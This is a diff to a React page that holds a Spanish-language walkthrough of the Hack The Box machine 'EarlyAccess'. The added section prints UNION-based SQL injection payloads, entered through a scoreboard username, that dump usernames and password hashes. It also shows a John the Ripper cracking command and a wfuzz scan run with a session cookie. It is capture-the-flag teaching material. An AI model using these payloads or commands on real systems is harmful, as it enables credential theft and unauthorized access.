@@ -92,7 +92,7 @@ export function EarlyAccess() {
         earlyaccess.htb - TCP 443
       </SubThreeTitle>
       <Paragraph>
-        Usmeando la pagina vemos un correo <i>admin@earlyaccess.htb</i>, luego decidimos registrarnos e ingresar con nuestra cuenta.
+        Inspeccionando la página vemos un correo <i>admin@earlyaccess.htb</i>, al no ver nada interesante nos registramos con una cuenta.
       </Paragraph>
       <Paragraph>
         Una vez dentro nuestra cuenta vemos varias pestañas nuevas Home, Messaging, Forum, Store y Register Key, notamos que al enviar mensajes nos responden al instante probamos alguna SQLI pero no obtenemos nada.
@@ -167,8 +167,8 @@ export function EarlyAccess() {
       <Highlighter
         text={`
         class Key:    
-          key = ""    
-          magic_value = "XP" # Static (same on API)    
+          key = ""
+          magic_val = "XP" # Static (same on API)    
           magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)    
           
           def __init__(self, key:str, magic_num:int=346):    
@@ -554,14 +554,149 @@ export function EarlyAccess() {
         luego hacemos una peticion a <i>/login</i> con nuestra cuenta creada y arrastramos posteriormente nuestra session
         para hacer peticiones <i>post</i> por cada key y actualizando el token de <i>/key</i>.
       </Paragraph>
+      <Image
+        src='/key_page.webp'
+        layout="responsive"
+        width={506}
+        height={345}
+      />
     </ContentBlock>
     <ContentBlock>
       <SubTitle>
         Dev Access
       </SubTitle>
       <Paragraph>
-        
+        Refrescamos la página e ingresamos a <i>game.earlyaccess.htb</i>.
       </Paragraph>
+      <Image
+        src='/game_version.webp'
+        layout="responsive"
+        width={700}
+        height={662}
+      />
+      <Paragraph>
+        Despues de jugar al juego de la serpiente, nos vamos a la pestaña de scoreboard
+        y vemos el tablero.
+      </Paragraph>
+      <Image
+        src='/scoreboard_top_ten.webp'
+        layout="responsive"
+        width={592}
+        height={296}
+      />
+      <Paragraph>
+        Recordemos que en el foro hablaban que habia un error en la parte del scoreboard
+        relacionado con el nombre de usuario.
+      </Paragraph>
+      <Image
+        src='/scoreboard_comment.webp'
+        layout="responsive"
+        width={592}
+        height={296}
+      />
+      <Paragraph>
+        Nos vamos a la pestaña de Perfil y añadimos una <i>'</i> al final de nuestro nombre
+        volvemos al scoreboard y que paso?? 
+      </Paragraph>
+      <Image
+        src='/scoreboard_error.webp'
+        layout="responsive"
+        width={1266}
+        height={277}
+      />
+      <Paragraph>
+      Basado en la respuesta añadimos un parentesis al final, actualizamos nuestro
+      nombre de usuario <i>leonardo') -- -</i> y vemos que en el score no tenemos error
+      es una buena señal porque ahora podremos leer la DB. 
+      </Paragraph>
+      <Paragraph>
+        Hay muchas formas de tener acceso basados en <i>SQL</i> nosotros usaremos la siguiente
+        logica.
+      </Paragraph>
+      <Highlighter 
+        text={`
+        leonardo') order by 3-- -
+        `}
+      />
+      <Highlighter 
+        text={`
+        leonardo') union select 1, 2, database()-- -
+        `}
+      />
+      <Highlighter 
+        text={`
+        leonardo') union select 1, 2, table_name from information_schema.tables where table_schema="db"-- -
+        `}
+      />
+      <Highlighter 
+        text={`
+        leonardo') union select 1, 2, table_name from information_schema.tables where table_schema=0x6462-- -
+        `}
+      />
+      <Highlighter 
+        text={`
+        leonardo') union select 1, 2, column_name from information_schema.columns where table_schema=0x6462 and table_name='users'-- -
+        `}
+      />
+      <Highlighter 
+        text={`
+        leonardo') union select 1, 2, group_concat(name, 0x3a, password) from users-- -
+        `}
+      />
+      <Image
+        src='/passwords.webp'
+        layout="responsive"
+        width={1287}
+        height={357}
+      />
+      <Paragraph>
+        Guardamos el texto en un archivo <i>hash.txt</i> para luego intentar romperlo con <a src='https://github.com/openwall/john' target='_blank' noreferer={true}>jhon</a>.
+      </Paragraph>
+      <Highlighter
+        text={`
+            jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
+        `}
+      />
+      <Paragraph>
+        !SAS¡ Obtenemos la contraseña <i>gameover</i> para el correo <i>admin@earlyaccess</i>,
+        iniciamos session en <i>https://dev.earlyaccess.htb/index.php</i>
+      </Paragraph>
+      
+    </ContentBlock>
+    <ContentBlock>
+      <SubTitle>
+          Shell como www-data - Admin
+      </SubTitle>
+      <Image
+        src='/admin_login.webp'
+        layout="responsive"
+        width={840}
+        height={1374}
+      />
+      <Paragraph>
+      En la herramienta de hashear vemos que la peticion la hace a <i>/actions/hash.php</i>.
+      </Paragraph>
+      <Highlighter 
+        text={`
+        action=hash&redirect=true&password=leonardo1234&hash_function=md5
+        `}
+      />
+      <Paragraph>
+        Podemos pensar que existen mas archivos <i>.php</i> en el directorio <i>/actions</i> asi que vamos
+        a aplicar un <i>fuzzing</i> a esa ruta y descubrir nuevos archivos.
+      </Paragraph>
+      <Highlighter
+        text={`
+          wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID-54n248979024dq084fckdn90" "http://dev.earlyaccess.htb/actions/FUZZ.php"
+        `}
+      />
+      <Image
+        src='/admin_login.webp'
+        layout="responsive"
+        width={840}
+        height={1374}
+      />
+      
     </ContentBlock>
   </>
 }
